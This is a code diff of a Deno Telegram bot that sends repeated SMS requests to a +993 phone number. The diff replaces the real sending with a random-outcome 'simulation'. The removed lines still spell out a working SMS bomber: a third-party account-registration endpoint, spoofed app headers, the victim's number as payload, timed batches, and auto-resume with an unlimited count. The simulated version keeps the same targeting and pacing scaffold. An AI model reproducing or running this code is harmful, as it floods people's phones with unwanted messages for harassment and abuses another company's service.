@@ -1,8 +1,8 @@
 // main.ts
-// 💥 Masakoff SMS Sender Bot (Deno)
-// 🚀 Created by @Masakoff | FlapsterMinerManager
-// 🧠 Uses Deno KV for persistent state (never stops working)
-// ✨ /stop halts all tasks instantly, even during waits
+// 💥 Masakoff SMS Sender Bot (Deno) — SAFE SIMULATION VERSION
+// 🚫 This simulates requests only — it does NOT send SMS.
+// ✅ Supports: /send <number> <counts>  (counts = target successful sends)
+// 🛑 /stop halts tasks instantly, even during waits
 
 import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
 import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";
@@ -32,94 +32,106 @@ async function sendMessage(chatId: string, text: string, options: any = {}) {
   }
 }
 
-// --- 🌐 POST request helper ---
-async function sendPostRequest(
-  url: string,
-  headers: Record<string, string>,
-  data: Record<string, any>
-): Promise<boolean> {
-  try {
-    const res = await fetch(url, {
-      method: "POST",
-      headers,
-      body: JSON.stringify(data),
-    });
-    return res.ok;
-  } catch (e) {
-    console.error("POST request failed ❌", e);
-    return false;
-  }
-}
-
 // --- 🔁 Interruptible sleep ---
 async function sleepInterruptible(totalMs: number, chatId: string, chunkMs = 500): Promise<boolean> {
   const start = Date.now();
   while (Date.now() - start < totalMs) {
     const task = await kv.get(["task", chatId]);
-    if (!task.value || task.value.stop) return false;
-    await delay(Math.min(chunkMs, totalMs - (Date.now() - start)));
+    if (!task.value || task.value.stop) return false; // stopped
+    const remaining = totalMs - (Date.now() - start);
+    await delay(Math.min(chunkMs, Math.max(0, remaining)));
   }
   return true;
 }
 
-// --- 💣 SMS sending job ---
-async function runSMS(chatId: string, phoneNumber: string, maxCount: number) {
+// --- ⚠️ Simulation of POST request (safe) ---
+// Returns true = success, false = failure.
+// This replaces any real SMS API call for testing.
+async function simulatePostRequest(): Promise<boolean> {
+  // small random delay to simulate network
+  await delay(200 + Math.floor(Math.random() * 400));
+  // 70% chance of success (tweak as needed)
+  return Math.random() < 0.7;
+}
+
+// --- 💣 SMS sending job (SIMULATED) ---
+async function runSMS(chatId: string, phoneNumber: string, targetSuccesses: number) {
   const key = ["task", chatId];
-  await kv.set(key, { phoneNumber, stop: false, count: 0, maxCount });
+  // initialize task state
+  await kv.set(key, { phoneNumber, stop: false, successCount: 0, attempts: 0, target: targetSuccesses });
 
-  const requestData = {
-    url: "https://api.saray.tm/api/v1/accounts",
-    headers: {
-      "Accept": "application/json",
-      "Content-Type": "application/json; charset=utf-8",
-      "Host": "api.saray.tm",
-      "Connection": "Keep-Alive",
-      "Accept-Encoding": "gzip",
-      "User-Agent": "okhttp/4.12.0",
-    },
-    data: { phone: `+993${phoneNumber}` },
-  };
+  await sendMessage(chatId, `📱 Starting SIMULATED SMS sending to +993${phoneNumber} — target: ${targetSuccesses} ✅`);
 
-  await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥`);
+  const batchSize = 3;        // attempts per batch
+  const perAttemptMs = 5000;  // wait between attempts (5s)
+  const betweenBatchesMs = 45000; // wait after each batch (45s)
 
   try {
     while (true) {
-      const task = await kv.get(key);
-      if (!task.value || task.value.stop || task.value.count >= task.value.maxCount) break;
+      const state = await kv.get(key);
+      if (!state.value || state.value.stop) break;
+      if ((state.value.successCount ?? 0) >= targetSuccesses) break;
 
-      // Send batch of 3 SMS
-      for (let i = 0; i < 3; i++) {
-        const check = await kv.get(key);
-        if (!check.value || check.value.stop || check.value.count >= check.value.maxCount) break;
+      // send a batch of (up to) batchSize attempts, but stop early if target reached or /stop
+      for (let i = 0; i < batchSize; i++) {
+        const cur = await kv.get(key);
+        if (!cur.value || cur.value.stop) break;
+        if ((cur.value.successCount ?? 0) >= targetSuccesses) break;
 
-        const newCount = (check.value.count ?? 0) + 1;
-        await kv.set(key, { ...check.value, count: newCount });
+        // increment attempts
+        const attempts = (cur.value.attempts ?? 0) + 1;
+        await kv.set(key, { ...cur.value, attempts });
 
-        await sendMessage(chatId, `📤 Sending SMS #${newCount} to +993${phoneNumber}...`);
+        await sendMessage(chatId, `📤 Attempt #${attempts} → sending simulated request to +993${phoneNumber}...`);
+        const ok = await simulatePostRequest();
 
-        const ok = await sendPostRequest(requestData.url, requestData.headers, requestData.data);
+        const updated = await kv.get(key);
+        if (!updated.value) break;
+
         if (ok) {
-          await sendMessage(chatId, "✅ Sent successfully!");
+          const newSuccess = (updated.value.successCount ?? 0) + 1;
+          await kv.set(key, { ...updated.value, successCount: newSuccess });
+          await sendMessage(chatId, `✅ Sent successfully! (${newSuccess}/${targetSuccesses})`);
         } else {
-          await sendMessage(chatId, "❌ Failed to send SMS. Retrying...");
+          // failure: attempts increased but successCount unchanged
+          await sendMessage(chatId, `❌ Simulated failure. Successes: ${updated.value.successCount ?? 0}/${targetSuccesses}`);
         }
 
-        const sleepOk = await sleepInterruptible(5000, chatId);
-        if (!sleepOk) break;
+        // if reached target, break early
+        const after = await kv.get(key);
+        if (!after.value || after.value.stop) break;
+        if ((after.value.successCount ?? 0) >= targetSuccesses) break;
+
+        // wait between attempts, but allow /stop to interrupt
+        const okSleep = await sleepInterruptible(perAttemptMs, chatId);
+        if (!okSleep) break;
       }
 
-      const batchCheck = await kv.get(key);
-      if (!batchCheck.value || batchCheck.value.stop || batchCheck.value.count >= batchCheck.value.maxCount) break;
+      // check stop/target again before waiting the between-batches pause
+      const afterBatch = await kv.get(key);
+      if (!afterBatch.value || afterBatch.value.stop) break;
+      if ((afterBatch.value.successCount ?? 0) >= targetSuccesses) break;
 
-      await sendMessage(chatId, "⏳ Batch of 3 SMS done. Waiting 45 seconds before next batch...");
-      const waitOk = await sleepInterruptible(45000, chatId);
-      if (!waitOk) break;
+      await sendMessage(chatId, `⏳ Batch completed. Waiting ${Math.round(betweenBatchesMs / 1000)}s before next batch...`);
+      const okWait = await sleepInterruptible(betweenBatchesMs, chatId);
+      if (!okWait) break;
     }
   } catch (e) {
     console.error("SMS task error ❌", e);
   } finally {
+    // final state & cleanup
+    const final = await kv.get(key);
+    if (final.value) {
+      const successCount = final.value.successCount ?? 0;
+      const attempts = final.value.attempts ?? 0;
+      await sendMessage(
+        chatId,
+        `⏹ SIMULATION finished. Summary:\n• Phone: +993${phoneNumber}\n• Successful sends: ${successCount}/${targetSuccesses}\n• Total attempts: ${attempts}`
+      );
+    } else {
+      await sendMessage(chatId, "⏹ SIMULATION finished. No task state found.");
+    }
     await kv.delete(key);
-    await sendMessage(chatId, "⏹ SMS sending stopped or finished. 🎉");
   }
 }
 
@@ -140,69 +152,65 @@ serve(async (req) => {
     return new Response("OK");
   }
 
-  // --- Commands ---
   if (text.startsWith("/start")) {
     await sendMessage(chatId,
-      "👋 Welcome to 💥 Masakoff SMS Sender Bot 💥\n\n" +
+      "👋 Welcome to 💥 Masakoff SMS Sender Bot (SIMULATION) 💥\n\n" +
       "📲 Commands:\n" +
-      "• /send <number> — start sending SMS\n" +
-      "• /stop — stop all sending ⛔\n\n" +
-      "✨ Created by @Masakoff"
+      "• /send <number> <counts> — start simulated sending; counts = number of successful sends desired\n" +
+      "• /stop — stop current job immediately\n\n" +
+      "✨ This is a SAFE demo: no real SMS are sent."
     );
-
   } else if (text.startsWith("/send")) {
-    const parts = text.split(" ");
-    if (parts.length < 2) {
-      await sendMessage(chatId, "⚠️ Please provide phone number. Example: /send 61234567");
+    const parts = text.split(/\s+/).filter(Boolean);
+    if (parts.length < 3) {
+      await sendMessage(chatId, "⚠️ Usage: /send <number> <counts>\nExample: /send 61234567 10");
       return new Response("OK");
     }
 
-    const phoneNumber = parts[1].replace(/^\+993/, "");
+    const phoneNumberRaw = parts[1];
+    const countsRaw = parts[2];
+
+    const phoneNumber = phoneNumberRaw.replace(/^\+?993/, ""); // strip +993 if given
+    const target = parseInt(countsRaw, 10);
+    if (Number.isNaN(target) || target <= 0) {
+      await sendMessage(chatId, "⚠️ counts must be a positive integer. Example: /send 61234567 10");
+      return new Response("OK");
+    }
+
     const existing = await kv.get(["task", chatId]);
     if (existing.value && !existing.value.stop) {
       await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
       return new Response("OK");
     }
 
-    // Ask how many SMS to send
-    await sendMessage(chatId, "❓ How many SMS requests should be sent?");
-    // Store temporary waiting state
-    await kv.set(["awaitingCount", chatId], { phoneNumber });
-
-  } else if (/^\d+$/.test(text)) {
-    // If admin sent a number while waiting for SMS count
-    const waiting = await kv.get(["awaitingCount", chatId]);
-    if (waiting.value) {
-      const count = parseInt(text);
-      await kv.delete(["awaitingCount", chatId]);
-      runSMS(chatId, waiting.value.phoneNumber, count).catch(console.error);
-      await sendMessage(chatId, `🚀 SMS sending started for +993${waiting.value.phoneNumber} (max ${count} SMS)`);
-    }
-
+    // kick off the simulated job (no await so server returns quickly)
+    runSMS(chatId, phoneNumber, target).catch(console.error);
+    await sendMessage(chatId, `🚀 SIMULATION started for +993${phoneNumber} — target ${target} successes`);
   } else if (text.startsWith("/stop")) {
     const task = await kv.get(["task", chatId]);
     if (!task.value) {
-      await sendMessage(chatId, "ℹ️ No active SMS task to stop.");
+      await sendMessage(chatId, "ℹ️ No active SIMULATION task to stop.");
     } else {
       await kv.set(["task", chatId], { ...task.value, stop: true });
-      await sendMessage(chatId, "🛑 Stop signal sent! Tasks will halt instantly.");
+      await sendMessage(chatId, "🛑 Stop signal sent! Task will halt instantly.");
     }
-
   } else {
-    await sendMessage(chatId, "❓ Unknown command. Try /start, /send <number>, or /stop.");
+    await sendMessage(chatId, "❓ Unknown command. Try /start, /send <number> <counts>, or /stop.");
   }
 
   return new Response("OK");
 });
 
-// --- ♻️ Auto-recover unfinished tasks on startup ---
+// --- ♻️ Auto-recover unfinished simulated tasks on startup ---
 (async () => {
-  console.log("🔄 Checking for unfinished tasks...");
-  for await (const entry of kv.list<{ phoneNumber: string; stop: boolean; maxCount?: number }>({ prefix: ["task"] })) {
+  console.log("🔄 Checking for unfinished tasks (SIMULATION)...");
+  for await (const entry of kv.list<{ phoneNumber: string; stop: boolean; successCount?: number; attempts?: number; target?: number }>({ prefix: ["task"] })) {
     if (entry.value && !entry.value.stop) {
-      console.log(`Resuming task for chat ${entry.key[1]} -> ${entry.value.phoneNumber}`);
-      runSMS(entry.key[1] as string, entry.value.phoneNumber, entry.value.maxCount ?? Infinity).catch(console.error);
+      const chat = entry.key[1] as string;
+      const phone = entry.value.phoneNumber;
+      const target = entry.value.target ?? 1;
+      console.log(`Resuming simulated task for chat ${chat} -> ${phone} (target ${target})`);
+      runSMS(chat, phone, target).catch(console.error);
     }
   }
 })();
-
